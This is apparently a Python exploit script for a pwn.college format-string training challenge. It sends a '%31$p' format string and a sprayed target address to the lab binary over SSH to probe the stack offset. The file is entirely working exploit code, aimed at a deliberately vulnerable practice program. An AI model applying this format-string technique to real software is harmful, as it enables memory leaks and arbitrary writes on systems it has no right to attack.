import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

pointer = struct.pack("<Q", ADDR)
spray_buf = bytearray(8 * 8 + 8)
for shift in range(8):
    spray_buf[shift : shift + 8] = pointer
spray = bytes(spray_buf)

fmt = "AAA |%31$p"
payload = fmt.encode() + spray

res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
print(res.stdout.decode("latin-1", errors="ignore"))
